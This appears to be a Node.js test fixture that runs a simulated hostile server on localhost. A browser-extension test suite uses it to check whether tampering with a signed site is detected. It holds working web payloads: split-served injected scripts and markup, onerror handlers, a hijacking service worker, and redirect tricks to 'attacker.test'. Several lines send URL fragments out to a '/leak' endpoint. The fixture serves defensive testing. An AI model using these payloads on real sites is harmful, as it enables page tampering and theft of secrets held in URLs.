#!/usr/bin/env node
/**
 * Hostile stand-in for the origin, for tests/extension-browser/run.js.
 *
 * One HTTPS listener on 127.0.0.1 answers for every host name the browser
 * under test is pointed at: the site itself (on any port), and
 * "attacker.test", an origin the server operator also controls. A plain HTTP
 * control listener, also on 127.0.0.1, lets the test runner switch the
 * server's behaviour and read what it received.
 *
 * The site's static files are served unchanged from the working tree, so
 * every hash in the signed manifest matches, except where a mode or a `poc`
 * query parameter says otherwise. Altered HTML is served to *navigations*
 * only; any other request for the same file, which is what a verification
 * fetch looks like, gets the signed bytes. That is the split serving a
 * compromised server would use.
 *
 * Usage: hostile-server.js <cert-dir> [https-port] [control-port]
 */

'use strict';

const fs = require('fs');
const http = require('http');
const https = require('https');
const path = require('path');

const [certDir, httpsPortArg, controlPortArg] = process.argv.slice(2);
const HTTPS_PORT = Number(httpsPortArg || 8443);
const CONTROL_PORT = Number(controlPortArg || 8442);
const staticDir = path.join(__dirname, '..', '..', 'static');

const ATTACKER_HOST = 'attacker.test';

const TYPES = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'text/javascript',
    '.css': 'text/css',
    '.json': 'application/json',
    '.svg': 'image/svg+xml',
    '.png': 'image/png',
    '.woff2': 'font/woff2',
};

/**
 * Server behaviour, set by the runner through the control listener.
 *   clean                    serve everything as signed
 *   redirect:<code>:<kind>   answer /c/<uuid> with a redirect of that status
 *                            code; kind is one of the keys of REDIRECTS
 *   link-header              add a Link: rel=stylesheet header to documents
 *   cacheable                make the (possibly altered) chat.html cacheable
 *   sw-install               serve a page that registers /sw.js
 */
const state = { mode: 'clean', log: [] };

const REDIRECTS = {
    internal: (uuid) => `/static/chat.html?room=${uuid}`,
    cross: () => `https://${ATTACKER_HOST}/collect`,
    'cross-fragment': () => `https://${ATTACKER_HOST}/collect#chosen-by-server`,
    'scheme-relative': () => `//${ATTACKER_HOST}/collect`,
    backslash: () => `/\\${ATTACKER_HOST}/collect`,
    port: () => 'https://pinchat.io:8444/collect',
    // Two hops that stay on the site, then off it.
    chain: () => '/static/hop1',
};

const HANDLER = '<img src="/static/missing.png" '
    + 'onerror="document.documentElement.setAttribute(\'data-attacker\',\'handler-ran\')">';

function injection(poc) {
    switch (poc) {
    case 'rel-exact': return '<link rel="stylesheet" href="/static/css/evil.css">';
    case 'rel-multi': return '<link rel="stylesheet nofollow" href="/static/css/evil.css">';
    case 'rel-case': return '<link rel="StyleSheet" href="/static/css/evil.css">';
    case 'inline-script':
        return '<script>document.documentElement.setAttribute("data-attacker","inline-ran")</script>';
    case 'markup': return '<p id="server-added">added by the server</p>';
    case 'directives':
        // No script at all: markup that the signed client-side framework
        // will interpret. It binds a piece of application state to the URL
        // of an image, which the policy lets the page load from the site.
        return '<div x-data><img id="server-added" alt="" :src="$store.chatRoom.connectingMessage"></div>';
    case 'handler': return HANDLER;
    default: return null;
    }
}

/** What an attacker-controlled origin does with a visitor: read the fragment. */
const COLLECT_PAGE = `<!DOCTYPE html><html><head><title>collect</title></head><body>
<p id="leak"></p>
<script>
document.getElementById('leak').textContent = location.hash;
fetch('/leak?fragment=' + encodeURIComponent(location.hash));
</script></body></html>`;

const SW_INSTALL_PAGE = `<!DOCTYPE html><html><head><title>install</title></head><body>
<p id="sw-status">pending</p>
<script>
navigator.serviceWorker.register('/sw.js', { scope: '/' })
  .then(() => navigator.serviceWorker.ready)
  .then(() => { document.getElementById('sw-status').textContent = 'registered'; })
  .catch((e) => { document.getElementById('sw-status').textContent = 'failed: ' + e.name; });
</script></body></html>`;

/** A worker that answers every navigation itself, with markup of its own. */
const SW_SCRIPT = `
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (event) => {
  if (event.request.mode !== 'navigate') return;
  event.respondWith(new Response(
    '<!DOCTYPE html><html><head><title>from worker</title></head><body>'
    + '<p id="marker">SERVED-BY-SERVICE-WORKER</p>'
    + '<script>document.documentElement.setAttribute("data-attacker","sw-inline-ran");'
    + 'fetch("/leak?fragment=sw-inline-ran")</' + 'script>'
    + '</body></html>',
    { headers: { 'content-type': 'text/html; charset=utf-8' } }
  ));
});
`;

function record(req, url, note) {
    state.log.push({
        host: req.headers.host || '',
        path: url.pathname,
        query: url.search,
        mode: req.headers['sec-fetch-mode'] || '',
        dest: req.headers['sec-fetch-dest'] || '',
        note: note || '',
    });
}

function send(res, status, headers, body) {
    res.writeHead(status, headers);
    res.end(body);
}

function handleAttacker(req, res, url) {
    if (url.pathname === '/leak') {
        record(req, url, `leak ${url.searchParams.get('fragment')}`);
        return send(res, 204, {}, '');
    }
    record(req, url);
    return send(res, 200, { 'content-type': 'text/html; charset=utf-8' }, COLLECT_PAGE);
}

function handleSite(req, res, url) {
    const host = req.headers.host || '';
    const navigation = req.headers['sec-fetch-mode'] === 'navigate';
    record(req, url);

    const room = /^\/c\/([0-9a-f-]{36})$/.exec(url.pathname);
    if (room) {
        const [, kind, code, target] = /^(redirect):(\d+):(.+)$/.exec(state.mode) || [];
        if (kind && REDIRECTS[target]) {
            return send(res, Number(code), { location: REDIRECTS[target](room[1]) }, '');
        }
        return send(res, 303, { location: REDIRECTS.internal(room[1]) }, '');
    }
    if (url.pathname === '/static/hop1') return send(res, 302, { location: '/static/hop2' }, '');
    if (url.pathname === '/static/hop2') return send(res, 307, { location: REDIRECTS.cross() }, '');
    if (url.pathname === '/collect') {
        // Same host on another port: still attacker-controlled.
        return send(res, 200, { 'content-type': 'text/html; charset=utf-8' }, COLLECT_PAGE);
    }
    if (url.pathname === '/leak') {
        state.log[state.log.length - 1].note = `leak ${url.searchParams.get('fragment')}`;
        return send(res, 204, {}, '');
    }
    if (url.pathname === '/sw.js') {
        return send(res, 200, { 'content-type': 'text/javascript', 'service-worker-allowed': '/' }, SW_SCRIPT);
    }
    if (url.pathname === '/static/sw-install.html') {
        return send(res, 200, { 'content-type': 'text/html; charset=utf-8' }, SW_INSTALL_PAGE);
    }
    if (url.pathname === '/static/css/evil.css') {
        return send(res, 200, { 'content-type': 'text/css' }, 'html { outline: 9px solid rgb(255, 0, 0); }');
    }
    if (!url.pathname.startsWith('/static/')) return send(res, 404, {}, '');

    const file = path.join(staticDir, path.normalize(url.pathname.slice('/static/'.length)));
    if (!file.startsWith(staticDir + path.sep) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) {
        return send(res, 404, {}, '');
    }

    let body = fs.readFileSync(file);
    const headers = {
        'content-type': TYPES[path.extname(file)] || 'application/octet-stream',
        'cache-control': 'no-store',
    };
    const isDocument = path.extname(file) === '.html';
    // Port 8446 in the Host header: the altered page goes to every request,
    // so a verification fetch sees it too (control case).
    const everyRequest = host.endsWith(':8446');
    const extra = injection(url.searchParams.get('poc'));
    if (extra && isDocument && (navigation || everyRequest)) {
        body = Buffer.from(body.toString('utf8').replace('</body>', `${extra}</body>`));
    }
    if (isDocument && navigation && state.mode === 'link-header') {
        headers.link = '</static/css/evil.css>; rel=stylesheet';
    }
    if (isDocument && navigation && state.mode === 'cacheable') {
        headers['cache-control'] = 'public, max-age=600';
    }
    return send(res, 200, headers, body);
}

https.createServer({
    key: fs.readFileSync(path.join(certDir, 'key.pem')),
    cert: fs.readFileSync(path.join(certDir, 'cert.pem')),
}, (req, res) => {
    const url = new URL(req.url, 'https://placeholder');
    const hostname = (req.headers.host || '').replace(/:\d+$/, '');
    if (hostname === ATTACKER_HOST) return handleAttacker(req, res, url);
    return handleSite(req, res, url);
}).listen(HTTPS_PORT, '127.0.0.1');

http.createServer((req, res) => {
    const url = new URL(req.url, 'http://placeholder');
    if (url.pathname === '/mode') {
        state.mode = url.searchParams.get('set') || 'clean';
        return send(res, 200, {}, state.mode);
    }
    if (url.pathname === '/reset') {
        state.log = [];
        return send(res, 200, {}, 'ok');
    }
    if (url.pathname === '/log') {
        return send(res, 200, { 'content-type': 'application/json' }, JSON.stringify(state.log));
    }
    return send(res, 404, {}, '');
}).listen(CONTROL_PORT, '127.0.0.1', () => {
    console.log(`hostile origin on 127.0.0.1:${HTTPS_PORT}, control on 127.0.0.1:${CONTROL_PORT}`);
});
